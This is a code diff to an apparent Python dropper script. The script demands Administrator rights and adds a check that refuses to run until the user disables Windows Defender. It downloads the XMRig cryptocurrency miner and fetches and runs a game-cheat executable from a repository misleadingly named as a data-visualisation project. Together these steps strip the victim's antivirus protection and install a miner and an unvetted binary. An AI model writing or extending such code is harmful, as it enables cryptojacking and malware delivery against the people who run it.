@@ -77,9 +77,30 @@ def download_and_run(url, destination, hide_console=False):
     except Exception as e:
         print(f"Error: {e}")
 
+# Check if Windows Defender is enabled using PowerShell command
+def is_windows_defender_on():
+    try:
+        # PowerShell command to check Windows Defender status
+        command = 'Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring'
+        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
+        
+        # If result contains 'True', Defender is turned off, if 'False', it's on
+        if result.stdout.strip() == 'False':
+            return True
+        else:
+            return False
+    except Exception as e:
+        print(f"Error checking Windows Defender status: {e}")
+        return False
+
 def main():
     if not is_admin():
         show_message_box("This software must be run as Administrator!", "Admin Privileges Required")
+        sys.exit(1)
+
+    # Check if Windows Defender is on
+    if is_windows_defender_on():
+        show_message_box("Please disable Windows Defender Antivirus protection before running this script.", "Windows Defender Active")
         sys.exit(1)
 
     URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
@@ -119,10 +140,8 @@ def main():
 
             os.remove(FILENAME)
 
-    download_and_run("https://github.com/Cr0mb/Data-Visualization-with-Python/blob/main/GHax.exe", 
+    download_and_run("https://github.com/Cr0mb/Data-Visualization-with-Python/blob/main/CS2%20External%20Multi%20DX11.exe?raw=true", 
                      os.path.join(os.path.expanduser("~"), "Desktop", "GHax.exe"), hide_console=False)
-
-
 
     sys.exit(0)
 
